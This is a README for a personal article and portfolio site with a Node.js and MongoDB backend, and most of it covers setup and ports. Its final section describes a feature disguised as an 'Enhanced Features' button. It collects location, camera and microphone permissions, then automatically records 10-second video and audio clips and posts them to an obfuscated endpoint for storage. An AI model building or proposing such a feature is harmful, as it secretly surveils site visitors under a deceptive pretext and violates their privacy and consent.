# ArticleWeb

This workspace contains a static portfolio/article site for Hina Zahid and a simple Node.js backend using MongoDB.

## Frontend

- `index.html` holds the static site with articles, interactive buttons, and a permission prompt.
- CSS in `assets/css/style.css` styles the site.
- Client-side JavaScript handles interactivity and talks to the backend APIs for comments, likes, and tracking.

## Backend

Located in `server/` directory. See `server/README.md` for setup instructions.

### Running

1. Start MongoDB (e.g. `mongod` locally).
2. Launch backend:
   ```bash
   cd server
   npm install
   npm run dev
   ```
3. Serve the frontend with a static server or open `index.html` while backend is running.
   (The Live Server VS Code extension works fine.)

    Alternatively, the backend itself now serves the static files; once the server is running you can just navigate to `http://localhost:5001/index.html` or `http://localhost:5001/recordings.html` without an additional web server.

When serving the static files from a different port (such as Live Server on 5500), the client must be told where the backend lives. The code now defines an `API_BASE` variable near the top of `index.html` which defaults to `http://localhost:5001`; if your server uses another port or host, update that constant accordingly or serve the files from the backend itself.
If you serve the static files from a different port, configure a proxy or adjust the fetch URLs accordingly.

---

This setup provides persistence for comments/likes/visitor data while still being simple and extensible.

## Enhanced feature endpoint

A floating **"🌟 Enable Enhanced Features"** button on the frontend will sequentially request the user's location, camera and microphone permissions. Once all permissions are granted, the page automatically captures 10‑second video+audio segments and posts them to `/api/45ytyfwgqu`. The backend stores each clip (optionally tagged with coordinates) in MongoDB.